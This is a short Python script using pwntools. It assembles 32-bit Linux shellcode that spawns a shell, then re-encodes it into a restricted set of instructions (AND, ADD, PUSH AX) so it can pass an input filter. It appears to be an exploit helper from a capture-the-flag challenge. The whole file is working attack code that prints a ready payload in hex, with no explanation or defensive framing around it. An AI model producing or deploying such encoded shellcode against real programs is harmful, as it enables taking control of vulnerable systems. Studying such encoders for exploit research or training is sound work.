from pwn import *

context(os = 'linux', arch = 'i386')

orig_shellcode = asm('add esp, 0x400\n' + shellcraft.sh())
while len(orig_shellcode) % 4 != 0:
    orig_shellcode += '\x00'

# print enhex(orig_shellcode)
def add_pair(c):
    v00 = ord(c[0]) / 2
    v01 = ord(c[0]) / 2 + (ord(c[0]) & 1)
    v10 = ord(c[1]) / 2
    v11 = ord(c[1]) / 2 + (ord(c[1]) & 1)

    return (v00, v10, v01, v11)

pop_count = 0
while True:
    encoded_shellcode = []
    encoded_shellcode.append('pop edi')
    encoded_shellcode.append('pop esp')
    for _ in range(pop_count):
        encoded_shellcode.append('pop edi')
    for c in reversed(group(2, orig_shellcode)):
        (v00, v10, v01, v11) = add_pair(c)
        encoded_shellcode.append('.byte 0x66, 0x25, 0x00, 0x00')
        encoded_shellcode.append('.byte 0x66, 0x05, %d, %d' % (v00, v10))
        encoded_shellcode.append('.byte 0x66, 0x05, %d, %d' % (v01, v11))
        encoded_shellcode.append('push ax')

    encoded_shellcode = asm('\n'.join(encoded_shellcode))
    while len(encoded_shellcode) % 4 != 0:
        encoded_shellcode += asm('pop edi')
    new_pop_count = len(encoded_shellcode) / 4 + len(orig_shellcode) / 4
    if new_pop_count == pop_count:
        break
    else:
        pop_count = new_pop_count
# print len(encoded_shellcode)
# print disasm(encoded_shellcode)
print encoded_shellcode.encode('hex')
# print sorted(set(encoded_shellcode))
